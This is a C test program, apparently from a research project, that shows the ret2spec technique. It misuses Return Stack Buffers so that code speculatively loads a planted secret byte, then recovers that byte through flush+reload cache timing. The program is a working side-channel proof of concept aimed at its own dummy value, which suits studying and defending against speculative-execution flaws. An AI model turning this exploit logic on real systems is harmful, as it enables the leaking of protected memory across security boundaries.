#define _GNU_SOURCE
#include <assert.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>

#include "find_threshold.h"
#include "flush_and_reload.h"
#include "ret2spec.h"
#include "constants.h"

// This will test whether we can force a certain piece of
// code to be executed speculatively without TSX using the
// technique from the ret2spec paper.
// The idea will be to use the Return Stack Buffers (RSBs)
// to trigger a misspeculation, which will be used to to
// speculatively load a "secret" value into a buffer.
// This can then be measured using FLASH+RELOAD.
int main() {
  // const int threshold = find_in_cache_threshold();
  const int threshold = 150;
  assert(threshold > 0);

  const size_t secret = 0xe9;

  const size_t reload_buffer_size = PAGE_SIZE * VALUES_IN_BYTE;
  uint8_t reload_buffer[reload_buffer_size];
  memset(&reload_buffer, 0, reload_buffer_size);

  size_t results[VALUES_IN_BYTE];
  memset(&results, 0, sizeof(size_t) * VALUES_IN_BYTE);

  for (int i = 0; i < 1000; ++i) {
    flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
    uint64_t x = ret2spec((void*)&secret, reload_buffer); 
    reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);

    assert(x == 0);
  }

  for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
    printf("%lx\t%ld\n", i, results[i]);
  }

  printf("Threshold: %d\n", threshold);
}
